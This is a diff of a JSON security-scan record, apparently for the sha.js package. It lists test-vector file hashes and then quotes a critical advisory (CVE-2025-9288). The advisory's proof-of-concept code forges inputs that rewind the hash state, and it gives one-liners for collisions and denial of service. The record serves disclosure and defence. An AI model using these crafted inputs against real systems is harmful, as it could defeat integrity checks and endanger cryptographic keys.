+          "beforeHash": "012493c362b5c727ddd06d28c372455d934b46a2a4fd06169dcd004df584fbbf",
+          "afterHash": "85633dc4cae236d7ec19124eb7cc2b59207098ab0d7b92e2241202c0b2215c60"
+        },
+        "package/test/prepare/vectors/byte0110.dat": {
+          "beforeHash": "8dc525ff87590d6184a2cef1a4e44d95ec4128b68c318bbaab3c3cecec70da9c",
+          "afterHash": "751a8612707d2f75f8b657b05bedd924e12ff6e8551f77dc6fdff3ac278d3452"
+        },
+        "package/test/prepare/vectors/byte0111.dat": {
+          "beforeHash": "83df5490d577545a25486b2fa7635ed89c17da7d02694e0c4aa67794d4b1026a",
+          "afterHash": "8a195fc6beafeb07ebe87d1ced5718c3594b96f6b08ac6b729bdb043f5ffb2f0"
+        },
+        "package/test/prepare/vectors/byte0112.dat": {
+          "beforeHash": "58948acab47d2deb0099233db7b07aa9485656b47243736882e61e797a8a21df",
+          "afterHash": "706cdba02b4e85a1fcedcabbed226a767fb6c70f6deb3d13334a3ae5c63037bb"
+        },
+        "package/test/prepare/vectors/byte0113.dat": {
+          "beforeHash": "8e79082f2ac6cb6a2bbf0c879a6c8eb317f2473cb60fac0f249313a8711a4626",
+          "afterHash": "873b0ec72654730f0ac8306b4da9bdb3082fe4a302943bf0eab91b657f00fd8a"
+        },
+        "package/test/prepare/vectors/byte0114.dat": {
+          "beforeHash": "4b1f9242de631ea4275601c83645e056e4d4093106d229ed6851939c484b0850",
+          "afterHash": "3897b88e035c3107235f4c4bad20e81aff155de72ccf76226c6ee4f214262c49"
+        },
+        "package/test/prepare/vectors/byte0115.dat": {
+          "beforeHash": "5278b41be273dade4baf86dcea01c1265e95ce3f025f37486b36357e319568c1",
+          "afterHash": "1c8d378bcdfdb60c7ae9a4bb0c090d8bd53c7bf1f9a64aebd36b71a59a1aa6f7"
+        },
+        "package/test/prepare/vectors/byte0116.dat": {
+          "beforeHash": "4c58605af3ac93003cd5a17afbcfb7a86ea8c6dbb4247a5dc0fea79b936fd4cb",
+          "afterHash": "f7b72160a0375f30b7b13ef1258e655fe82691228ade8861911255c73d6f06a0"
+        },
+        "package/test/prepare/vectors/byte0117.dat": {
+          "beforeHash": "0b4dee5b448a93d6f3f0a5b789fc0ee0d8eaa8fb929058c87900de51de7f78f7",
+          "afterHash": "2fe9449f98dae7f34dfe26ff5b159d3ee088a0b697af4913e0f53af983ed79f2"
+        },
+        "package/test/prepare/vectors/byte0118.dat": {
+          "beforeHash": "441ef2b96b0fe1e5469a6a763c33c74e52c0b95412d94987b12d6c69fec20f7b",
+          "afterHash": "15937353bf9d48d7e1d13c7bc1f6953b91b16b5c14d8e634423e99e37f7b349c"
+        },
+        "package/test/prepare/vectors/byte0119.dat": {
+          "beforeHash": "a910f72bbb93cf53833bab3b044ac2e089b5274e28cfe17dc4faafcda71a7c09",
+          "afterHash": "6bad74acd9cccce463ec5e61d1e83b844f0aaba847a98a268e676e8413d81b93"
+        },
+        "package/test/prepare/vectors/byte0120.dat": {
+          "beforeHash": "27d2762ef75b7627c4e97fed6d68170fc059a7b6c13cc6b6520d0887c981c3c8",
+          "afterHash": "62b82603c2c43385d9c00f0dcfe19db48c71793e31255b7c7887aa6b15fbec4f"
+        },
+        "package/test/prepare/vectors/byte0121.dat": {
+          "beforeHash": "558b4e8442f2e2c5ac4d0f439f4768a042b68b19e0782ea73ebdcab429ed9705",
+          "afterHash": "ab6256a51109a9113c49dcdc9c7257ed9873e06afa1d261862de5ba1a69bb7df"
+        },
+        "package/test/prepare/vectors/byte0122.dat": {
+          "beforeHash": "964a9a37de33edfd2594acc9fa186bf73271c2dc5427c5c28ceaa457f2d5a3e1",
+          "afterHash": "72908f9ddb286f511e131860ac205f3e66f9f532ecb7a8841b77dbaf9c7f2c50"
+        },
+        "package/test/prepare/vectors/byte0123.dat": {
+          "beforeHash": "7e4b10cd35032834383674a986e729ecc3813ec5c4010998a335bae94133480d",
+          "afterHash": "3f67a6a437136ddd6395b6e992866e3c604083c2b99fd4682074e0935710c844"
+        },
+        "package/test/prepare/vectors/byte0124.dat": {
+          "beforeHash": "1a48a7e29295aad99d5c0a00506bda0f3218bb4574ca098404bbb924f8445dfd",
+          "afterHash": "deb81b5aeba4772759003da4ab3217f58d38bd37619a7af420db8fdd8bda54b2"
+        },
+        "package/test/prepare/vectors/byte0125.dat": {
+          "beforeHash": "eb2bcfe5c488a307f0ee0ecfb96570c05ef2f101881b0a2d2915e4e380237ded",
+          "afterHash": "0f19d6c994bebac125b0939c6a27c278a9fab02bdfe78a9bc7f3664253197c01"
+        },
+        "package/test/prepare/vectors/byte0126.dat": {
+          "beforeHash": "7a5952e4f2fe2a66e808f6249cb62fe90cee8f6f77dbe92dcf8c1bf4072633b2",
+          "afterHash": "a9393b3cd382e54e5e7abcbc947faa8b01bef488a6e65ad12f770e0ba94884eb"
+        },
+        "package/test/prepare/vectors/byte0127.dat": {
+          "beforeHash": "8e62eb2a730dfa5e8b35d5e20c5b2ecff77c695b7c4fe0c346203f90f557e438",
+          "afterHash": "a1ed59e6c9d565af0e9dbfd034e9d2599084752aad02dcc1ef17545d17c4943c"
+        },
+        "package/test/prepare/vectors/byte0128.dat": {
+          "beforeHash": "8fd40b85823ace340c1d461f6946ab5aed8ebe1897992edfea5470e17a94e452",
+          "afterHash": "af7151248abbe2ec31379aef9e0727ca0a36346bb30e6813f076f7bb5ffbf0b0"
+        },
+        "package/test/prepare/vectors/byte0129.dat": {
+          "beforeHash": "54d73f4a24cf2d105ffff603235f15027c5a452d7be897b9a08eadabe34a032b",
+          "afterHash": "1db8299e1efff257ec3967ed1ba40fcd0c378374808fde99ae3ca1ed1997412b"
+        },
+        "package/test/prepare/vectors/byte0130.dat": {
+          "beforeHash": "e6c462542eee2fa5aa93346d283942a6cb72818ac2cf44ea4cee837cb6b0954a",
+          "afterHash": "786607f0565d09938ea8d5f89c622d4cdc08e12889c955ee9defb47d61fba260"
+        },
+        "package/test/prepare/vectors/byte0131.dat": {
+          "beforeHash": "96902987536faa592fc664aa56553605cb12342a0b8eebc95f3cd544eaa7519f",
+          "afterHash": "8691fad6aae69ff7480426c7fe3014b2a1b029ccafa8dd97cdef2324cd184b04"
+        },
+        "package/test/prepare/vectors/byte0132.dat": {
+          "beforeHash": "e7011bc28f610361937201362ee9aaf94ad177e7d5730005cb1f8d5cd344ffd3",
+          "afterHash": "7ce42b8d7ea03210bb3ebc3369981e3f153d6846f131329a766852c134c69448"
+        },
+        "package/test/prepare/vectors/byte0133.dat": {
+          "beforeHash": "458d38616450275286ccb476bfc0c6df5e28e8e4ee19572d8577776e2c9fab95",
+          "afterHash": "797a77ad174502a6b368aa73f2a597a767ddbcb44c63b2eb21448f2cae84e633"
+        },
+        "package/test/prepare/vectors/byte0134.dat": {
+          "beforeHash": "21d93cbdb2f521fbd7275cd2ef88ffa73fb45497236e77b8d0154f550eb82202",
+          "afterHash": "f5759e9b2866624a92f94b6444dfde4d4a30f4ac3cae83d6aa9c3aa216faf31c"
+        },
+        "package/test/prepare/vectors/byte0135.dat": {
+          "beforeHash": "0e4797e7d3021965a25fe0b7bf94c5c9af973bee54cf4febc99fa5439e5e219b",
+          "afterHash": "df1018970a288cf78f08e9dba6982f1957c2a8a89efc4eab61e1fcec3ce93237"
+        },
+        "package/test/prepare/vectors/byte0136.dat": {
+          "beforeHash": "2a0818b80e5378a9f2e2520587329c0993b8bf8c60d4db521f669650173aa1e7",
+          "afterHash": "e9f6c4a9d8c433f7e667362f01fbf5f2a6a82316c1841ce37e4f411c50416963"
+        },
+        "package/test/prepare/vectors/byte0137.dat": {
+          "beforeHash": "4c3b5b1788779e75a5a606bdada9bc133d7612c1dbb5bc4517d49cef923502c0",
+          "afterHash": "9169bb5d93265749fab2ea1af7c1b84c05111794c7e26daee65f5054b93abd6d"
+        },
+        "package/test/prepare/vectors/byte0138.dat": {
+          "beforeHash": "8f33b36b9427907b41c34815b79f93936c80437ebceacb62f6a7e9bdc4d4a48c",
+          "afterHash": "6fb24e358f5ed3e714bdb2b99a6b3b8d05c7de803f28288b2247a5d92de507df"
+        },
+        "package/test/prepare/vectors/byte0139.dat": {
+          "beforeHash": "5789e108fe2abf42dd9c916a8e0399f78cf20d8be39f01b01400ea41c6b107a6",
+          "afterHash": "298a23ffcc5ee65ac57e7c28989d87da10e8e2e0692e88844e75a6ba9d6ac8b3"
+        },
+        "package/test/prepare/vectors/byte0140.dat": {
+          "beforeHash": "481e1f7e1fe5d8499b1bcc91acca1ec9eb9e5d7790199206b9261b04a54a0392",
+          "afterHash": "3c3dd991f809807c0c4ce8eb15fabced9e2b83d8d2b487f28e64b35839b013f6"
+        },
+        "package/test/prepare/vectors/byte0141.dat": {
+          "beforeHash": "b84cc50b5f553d2dad688a5bec9ce18bd2ef51307bf20d71d7d044142328807f",
+          "afterHash": "3ab14d2a320a46d661d7b7c3f36a5376aa2e78f365ca5d3f00a31183f96df7b2"
+        },
+        "package/test/prepare/vectors/byte0142.dat": {
+          "beforeHash": "fe899c2047deb3f423ff37d21ac0bee21328092fe1d0c407e3f934a010e8b5a1",
+          "afterHash": "d1179aa9e2e94909dd2ada46437db73f04a16ad7b097e228c605b7691590f30f"
+        },
+        "package/test/prepare/vectors/byte0143.dat": {
+          "beforeHash": "231b4bdaa079a4b91aac49c589df90612e33952a1604695093ca18a3f7f15f63",
+          "afterHash": "0410f8406d67ffcb9b0f668ac65fb8a8ac7e8c4aa885c6aa2b41b2fe10ea0365"
+        },
+        "package/test/prepare/vectors/byte0144.dat": {
+          "beforeHash": "a12c54d14a0d752d1c4a2a44726ad4064a4ab5980547b72b1e7b31a2202ba57f",
+          "afterHash": "b8ed41edd96a24535b1378e232322febb72996325487f818298bc3a171c88163"
+        },
+        "package/test/prepare/vectors/byte0145.dat": {
+          "beforeHash": "bdaa91af3a32d3c63f9ab198ea6863ae19954c4bc1f393014f3e0253625c6e6f",
+          "afterHash": "a3b49b650ac74dd73a57fd62daa6e7dc1ffc10e11ed0312afaead583b1a34b85"
+        },
+        "package/test/prepare/vectors/byte0146.dat": {
+          "beforeHash": "a3a9ba29268025e79bdfff710ca106ccd410e697ccc1f58f8507ec04eebe89cc",
+          "afterHash": "791970a4abfe0fd9d4c5fc9397af4fff454532eec4904bb79cf51e2d3a947048"
+        },
+        "package/test/prepare/vectors/byte0147.dat": {
+          "beforeHash": "454b5caaa81f5f1844a04036c97bc9fbe81b03f718844fbef866b664b11d1642",
+          "afterHash": "47d5e83f644e7fe92b5b410b5040ce747dc0583c722687a3c2bb3477f95a72ee"
+        },
+        "package/test/prepare/vectors/byte0148.dat": {
+          "beforeHash": "686dbd4786e1d69cd1644be287d8f719224815ca6991e7031061ab16131e5650",
+          "afterHash": "3b5037ea975191d4b58dfd2db5aeaa5ee23ac1b9ef57b54d8a1206260b106161"
+        },
+        "package/test/prepare/vectors/byte0149.dat": {
+          "beforeHash": "6c74e3b0f8a6f40b6cd5ff683e28af6a14cb24f77539e0439ff70d9eaa3a0c6e",
+          "afterHash": "3ee2f9e767b316e3732f42a4656dd3a00e62e1a4e2f6a85a02eaaa7e7668bd35"
+        },
+        "package/test/prepare/vectors/byte0150.dat": {
+          "beforeHash": "de25f8288dba9c4f4b480f36d316293477db3f50a43ed74bac46d6c67e2eb7fd",
+          "afterHash": "e0a3419183369f24edff2950edf003abc55fab3f92f6295f2e303aa7bc69860d"
+        },
+        "package/test/prepare/vectors/byte0151.dat": {
+          "beforeHash": "0742c904dd0d79478977738407c9a07b02b207a0107e4ef38cacdaba4a1d910d",
+          "afterHash": "e4ae9236d1ec22b61e681efbd1f8bf27a43046c504fd2a4b0032052b04a138bd"
+        },
+        "package/test/prepare/vectors/byte0152.dat": {
+          "beforeHash": "e32554f93ba0ca6d928ab0dce9c9564c929a0ad764853eae45b307ac86ce2ab1",
+          "afterHash": "396681048a00728fe22dc9e6929cb1f2603e0637b1b5357b9cf977ecfefb60d7"
+        },
+        "package/test/prepare/vectors/byte0153.dat": {
+          "beforeHash": "b0816e5de3a51a728b0dd656660f656962a7fde1edfef43099c82c38c0adbfb8",
+          "afterHash": "6634f19429e4e3adbceefb71f7e34851668cbb3bcfec8937777dbe97ddd8d30d"
+        },
+        "package/test/prepare/vectors/byte0154.dat": {
+          "beforeHash": "e0d4af25b537f6459973ed7b72362571cb6c13409258f1f7d1ac085e04e691e4",
+          "afterHash": "ce6b7a665245a11ef02b0934fedd1208495c9f0b3a611eeb40e9e4a5f22f4fed"
+        },
+        "package/test/prepare/vectors/byte0155.dat": {
+          "beforeHash": "660a820942d20b8804eea7c60311e52821ac1f659e1833619ad5ec0a04469f13",
+          "afterHash": "8915d1931ebb541ff4b1418f8908f8274380ec9eb515567cbb934c1149d2ad92"
+        },
+        "package/test/prepare/vectors/byte0156.dat": {
+          "beforeHash": "babc98fcbfdffb56d05d11ebd4b44b9f30657b78646fad1e17bbb5509c444ca3",
+          "afterHash": "b89bf18444ddc2f551d9bfca1a2d46e9fc34745e8fc7b59fb9f4daca5885f8a8"
+        },
+        "package/test/prepare/vectors/byte0157.dat": {
+          "beforeHash": "ea511670bef2f8ae618f446ba227bb80cfe2194a78ec977527d66da95f97dda3",
+          "afterHash": "34165087e83d3ab56113555fb1f8c7a57b6e94de640d7182fb2b5eb96e9fc43f"
+        },
+        "package/test/prepare/vectors/byte0158.dat": {
+          "beforeHash": "d318cb1fe8d2111e920ad00ab58a4584a367ff2c3628806f7706d059dbe2a7ce",
+          "afterHash": "adadb019d5cf1ae3a479f87c4c4a7e736de6c1be3a04654563902e333b182534"
+        },
+        "package/test/prepare/vectors/byte0159.dat": {
+          "beforeHash": "c7676b4a7762a1b58bf2c425cf4a0551f8b8d53e35a7ffb71141613a962230c2",
+          "afterHash": "453678b1f8a28748e27cd0c8dc2d2677e6c1bfb9d1290cb382e551acf11ca4f0"
+        },
+        "package/test/prepare/vectors/byte0160.dat": {
+          "beforeHash": "f5254cf1be21134340f11ef392b5367648a71475f03211e38a7e1e876bc6a25d",
+          "afterHash": "849ca75cce336a70e539b06e7a3936b98df271555ab5f5c6ee1fa5cd444caec3"
+        },
+        "package/test/prepare/vectors/byte0161.dat": {
+          "beforeHash": "6d48bb7b84f48d403d0c73f3a0d11aa675c0fd9a17df640e79a5fdde5d067754",
+          "afterHash": "e38c6cbfa00fec0c37b4d51de7ec9f77248f4fa46da52c8cd0b826f445bec552"
+        },
+        "package/test/prepare/vectors/byte0162.dat": {
+          "beforeHash": "752006cd0c9101d99497f6d582e1d46b29de630b89520bab1ec812cc57d81202",
+          "afterHash": "06f0eb1ca059258692882d4f263ebb24e374e63a868951ab4ebfb2008814d792"
+        },
+        "package/test/prepare/vectors/byte0163.dat": {
+          "beforeHash": "a88d38e1e210cfc8b2aaa0503a9a842a6457b15b7a0f873346211b2bf4ee5194",
+          "afterHash": "01726422ff093f22f1c5283d800d977332034d432da49d81337b02b13f43a208"
+        },
+        "package/test/prepare/vectors/byte0164.dat": {
+          "beforeHash": "359cd1ee12ead9a273739e9f22146e423a74322c78fd4f05a69b7152499ece3e",
+          "afterHash": "ea8b80920815ec017b3233d9d1edaa9ae39b6b0ec953a672078f8bfcb2916da8"
+        },
+        "package/test/prepare/vectors/byte0165.dat": {
+          "beforeHash": "5a59e1276997fa648fcc8fa8f76abe8c4fb8bd32b6c039d03fed1f23c6c640aa",
+          "afterHash": "b67e46650761a22ea3de9665e30b48a77ec7599b1ab378f4bb73b2426d7abb3a"
+        },
+        "package/test/prepare/vectors/byte0166.dat": {
+          "beforeHash": "b89a9a86f5a61ba3f07eab1532caa950b9c8f74fc68e3af0a6a2f600ca0012cf",
+          "afterHash": "d84427c56f09532f37019902e064f6f2eb3ad6656e88bfb47edcc6f5bcc2f5bf"
+        },
+        "package/test/prepare/vectors/byte0167.dat": {
+          "beforeHash": "eff21e9bcfb110ee935b7f9e05229c07f5cf2c9c832703a2ab0aa3887067112b",
+          "afterHash": "d399f00439ea4ac846887ec87f1dcad7a96574c1bc255d2a196e495429b3acc6"
+        },
+        "package/test/prepare/vectors/byte0168.dat": {
+          "beforeHash": "fa3c5af03378f2fb17e482edb5d20edd02b7327983470bda907c8bab509bc6c2",
+          "afterHash": "3206c27a234be4b6d9d5e36aa2a3e018c6a8292e0484ec9413ae70ac291b46a6"
+        },
+        "package/test/prepare/vectors/byte0169.dat": {
+          "beforeHash": "bc31ac9612ba3fa3ec37cd61838a344fcf6e157220f709d51f0936b1f412a491",
+          "afterHash": "3520392fe27ec5efff3f4f050c1c2aef6daac385c6e7e1d35885841dbc5eed5a"
+        },
+        "package/test/prepare/vectors/byte0170.dat": {
+          "beforeHash": "2f03636c2ba83d84410fad1a3958d47b0442f3b4aadc353cf9f13cf4480b31e2",
+          "afterHash": "0443dcf82fd37951c4eeb9b682568fd03cc15d2ac4f4d666f00301eb2b41d84d"
+        },
+        "package/test/prepare/vectors/byte0171.dat": {
+          "beforeHash": "e914809c4698ec5950e5896991a0adf61c0ac0da4e55eefabfb4f2939d3c2a35",
+          "afterHash": "86f5d37da0ec654b5e7429ee4299e200745a3ed47e8234cc7aedc9b9877ff6bf"
+        },
+        "package/test/prepare/vectors/byte0172.dat": {
+          "beforeHash": "26e3898cd305d467d2ef6eb5665c5fb11ea4562ae0ee22c5aa1b69de344efd42",
+          "afterHash": "89c0b3b120e26d0c2d9c6633c72c827f5a65629fe57a4ce54af5f3796bb95235"
+        },
+        "package/test/prepare/vectors/byte0173.dat": {
+          "beforeHash": "761860396a506b6a6567c0a6f974d97f20777f0537020ad006994bd759b056ed",
+          "afterHash": "00077cf6a7564284b326f8720655bffd0be37f0473d009381f399a90523697b2"
+        },
+        "package/test/prepare/vectors/byte0174.dat": {
+          "beforeHash": "b4767ab47c5fa4347e1e32cfa98c3b6226d76cb15dbc4608fcdf901c26cae39c",
+          "afterHash": "cfa8105c75fd15fe8a9e81449f9bed448656bc098fd059e98e7b11503517eb0d"
+        },
+        "package/test/prepare/vectors/byte0175.dat": {
+          "beforeHash": "cfd7537f73f8b853479a33c82f3eca4bd557fed1dec5ae7429ce890b0e48b49d",
+          "afterHash": "3fdf4990b923c93658cab169594cfd36b2014da36e4c5e75b0de1beb360d63ee"
+        },
+        "package/test/prepare/vectors/byte0176.dat": {
+          "beforeHash": "540b5fa693bf745b25b342f30cfd968611a75c6f1c3a34bf282b4a5f76bbc9b6",
+          "afterHash": "4ef312e14dd246f36e2804af090d65c8e0db3427c8f8d16ac5d5cbb4c0a21a08"
+        },
+        "package/test/prepare/vectors/byte0177.dat": {
+          "beforeHash": "4bd60dc86148941b9f455c960515ec6de22e5f1bc96cf65aba58ab947a32f79d",
+          "afterHash": "c2acc2b71ed498577b83341d42641dcb2c470766d4bd7ea229092c8dfb391e0c"
+        },
+        "package/test/prepare/vectors/byte0178.dat": {
+          "beforeHash": "0f429f9daeaf1a05c68086178f9956b55766c62fb43340f9ffd6c5c2664e0e5c",
+          "afterHash": "989c804180b1f1fc5c7d59a7015d0c1c941181fe82a0994d114ff8e0aa8af26c"
+        },
+        "package/test/prepare/vectors/byte0179.dat": {
+          "beforeHash": "7085446c269c28ec0c1c1c46f8dff416db957278479366d9b20d88a9546d0076",
+          "afterHash": "efaaddc4846912ecbbb637bad95457f508c17f67ddcebfe6f0b36b5d59afe0a5"
+        },
+        "package/test/prepare/vectors/byte0180.dat": {
+          "beforeHash": "edf23fc5126b97d83a5743dc5d59f19c19858e6bfd014b254ce4ace3cc4b806f",
+          "afterHash": "1a0b6a317e7dca064da36c3b9003f1959be182577941ef3af715f1d58cacad00"
+        },
+        "package/test/prepare/vectors/byte0181.dat": {
+          "beforeHash": "44f0a98994fe67744c222849b6f1a554d14e9e710f06359394b18ee2ecb8edb4",
+          "afterHash": "5548ed5be937944f75b9edafdf687a352dd76fe2c125fcdef481e15b24a89b34"
+        },
+        "package/test/prepare/vectors/byte0182.dat": {
+          "beforeHash": "a5e8d9ffd55c4b4679dccf1778528dc122354bad23f8c539518aaaf4227b9fa6",
+          "afterHash": "e2fe3fbb73c90af74f9333702a241d22c1af288ed6b13487ca47b8ba3d34fe4b"
+        },
+        "package/test/prepare/vectors/byte0183.dat": {
+          "beforeHash": "28362de16a5981453f5c12aed0561f11b5672d17ed357b64125263c83a4c1e77",
+          "afterHash": "df5738fc540ab34071e76811f9389aad9b401727b8cecb11acf4e4bca10a547a"
+        },
+        "package/test/prepare/vectors/byte0184.dat": {
+          "beforeHash": "97baaa6d6e2f8ed276b908cf63ac718b9bf77105a003d13996a04866a05133b1",
+          "afterHash": "c86ababf5b585914d1377c1af153a4624d34cf40b7c751b38e235896b264858c"
+        },
+        "package/test/prepare/vectors/byte0185.dat": {
+          "beforeHash": "0a8b9fa2210e973bafe1d992f12037a451ef2c5774c71ad5ab1946215401a19f",
+          "afterHash": "ad2b8e7863b81fefd16c686552971d67f9674e84d00a0b01b67150b555f1ed7b"
+        },
+        "package/test/prepare/vectors/byte0186.dat": {
+          "beforeHash": "3204f0c41318cc99ef877d693537f34fb5d2936788dc6519fa770ac258ce6c1d",
+          "afterHash": "e14a00a64bd2da4e4a2ae314aeb5f316feb11da77d5136f42beb2f8999a91db9"
+        },
+        "package/test/prepare/vectors/byte0187.dat": {
+          "beforeHash": "86744ad96b10645427753001e719ed82a65ce78ae4c9d8ee6a7eef065723f0e2",
+          "afterHash": "513482b6f9fabdf08cafb1df26fae61fde05eed5e6b81053ac5421af09f5e08e"
+        },
+        "package/test/prepare/vectors/byte0188.dat": {
+          "beforeHash": "5b2c5556253867d82a19b824e8828924e8dacd24207e6534e3d36bbbc202a48a",
+          "afterHash": "3767718c77eed2c14dbfeaf55f7ed1222261836c70b15fd8de67d3cbbe31bdc2"
+        },
+        "package/test/prepare/vectors/byte0189.dat": {
+          "beforeHash": "e775d7db4ca5c8f9f6c00ec7840e3abb36215d45765f6a98017eb7dfdedc4d23",
+          "afterHash": "da8ede5b0144170632631c277a6a74b170c6f64614e21349668852f2769b52fd"
+        },
+        "package/test/prepare/vectors/byte0190.dat": {
+          "beforeHash": "de3293ef9b666c96e46490e9b49acb61bfd98f52645692d77279b86651fb0ce2",
+          "afterHash": "1d33e2c36edd6b6341cb14893cad1900a4b7e83d046da1d966300d6f61c507d4"
+        },
+        "package/test/prepare/vectors/byte0191.dat": {
+          "beforeHash": "426d7e0e0acfd62aff5de07990fb125e4846087b26224e003d73538bd64692f6",
+          "afterHash": "d8d4773f04b6e1f44329e2f3f78d0094386797344d3ac3814d9576085a6cafcc"
+        },
+        "package/test/prepare/vectors/byte0192.dat": {
+          "beforeHash": "babd6c041a34e9a1d39f574505e0d67f4ddbf30ab5c5fc148e80438d478e89d2",
+          "afterHash": "69eaffc619299ef71865b26be9e371572e5d22e0576ff4fe7f92116f59a6b535"
+        },
+        "package/test/prepare/vectors/byte0193.dat": {
+          "beforeHash": "a094588bbd8b82824166840d3d45ff95def5e0217bc6f37effd2c5d28b1bfa53",
+          "afterHash": "6652ea7eceee762ddbf6a0a509051506798ff3c34bbc6bf3c6cba4b9ebfb086d"
+        },
+        "package/test/prepare/vectors/byte0194.dat": {
+          "beforeHash": "b2ce49f9fc9483e7ed65038138f853f9b14bd7a64a7e28960aeff10dabc2d1a4",
+          "afterHash": "ad07914a68b59357dc87ed1446c387ed3ba6f391348fe1e3911b4062173c8001"
+        },
+        "package/test/prepare/vectors/byte0195.dat": {
+          "beforeHash": "c93a4b089910d179152f1e6ddd02f3a63e877d27da55eab29f3196a36b0f86e2",
+          "afterHash": "30f3bb1ab533381c822f85af0770c8d2f0a18a466d2c29a4c716aa2f6496b760"
+        }
+      },
+      "vulnerabilities": {
+        "GHSA-95m3-7q98-8xr5": {
+          "cves": [
+            "CVE-2025-9288"
+          ],
+          "summary": "sha.js is missing type checks leading to hash rewind and passing on crafted data",
+          "severity": "CRITICAL",
+          "description": "### Summary\n\nThis is the same as [GHSA-cpq7-6gpm-g9rc](https://github.com/browserify/cipher-base/security/advisories/GHSA-cpq7-6gpm-g9rc) but just for `sha.js`, as it has its own implementation.\n\nMissing input type checks can allow types other than a well-formed `Buffer` or `string`, resulting in invalid values, hanging and rewinding the hash state (including turning a tagged hash into an untagged hash), or other generally undefined behaviour.\n\n### Details\n\nSee PoC\n\n### PoC\n```js\nconst forgeHash = (data, payload) => JSON.stringify([payload, { length: -payload.length}, [...data]])\n\nconst sha = require('sha.js')\nconst { randomBytes } = require('crypto')\n\nconst sha256 = (...messages) => {\n  const hash = sha('sha256')\n  messages.forEach((m) => hash.update(m))\n  return hash.digest('hex')\n}\n\nconst validMessage = [randomBytes(32), randomBytes(32), randomBytes(32)] // whatever\n\nconst payload = forgeHash(Buffer.concat(validMessage), 'Hashed input means safe')\nconst receivedMessage = JSON.parse(payload) // e.g. over network, whatever\n\nconsole.log(sha256(...validMessage))\nconsole.log(sha256(...receivedMessage))\nconsole.log(receivedMessage[0])\n```\n\nOutput:\n```\n638d5bf3ca5d1decf7b78029f1c4a58558143d62d0848d71e27b2a6ff312d7c4\n638d5bf3ca5d1decf7b78029f1c4a58558143d62d0848d71e27b2a6ff312d7c4\nHashed input means safe\n```\n\nOr just:\n```console\n> require('sha.js')('sha256').update('foo').digest('hex')\n'2c26b46b68ffc68ff99b453c1d30413413422d706483bfa0f98a5e886266e7ae'\n> require('sha.js')('sha256').update('fooabc').update({length:-3}).digest('hex')\n'2c26b46b68ffc68ff99b453c1d30413413422d706483bfa0f98a5e886266e7ae'\n```\n\n### Impact\n\n1. Hash state rewind on `{length: -x}`. This is behind the PoC above, also this way an attacker can turn a tagged hash in cryptographic libraries into an untagged hash.\n2. Value miscalculation, e.g. a collision is generated by `{ length: buf.length, ...buf, 0: buf[0] + 256 }`\n    This will result in the same hash as of `buf`, but can be treated by other code differently (e.g. bn.js)\n4. DoS on `{length:'1e99'}`\n5. On a subsequent system, (2) can turn into matching hashes but different numeric representations, leading to issues up to private key extraction from cryptography libraries (as nonce is often generated through a hash, and matching nonces for different values often immediately leads to private key restoration)"
+        }
+      },
+      "description": "",
+      "license": "MIT",
+      "tier": "free"
+    }
+  }
+}
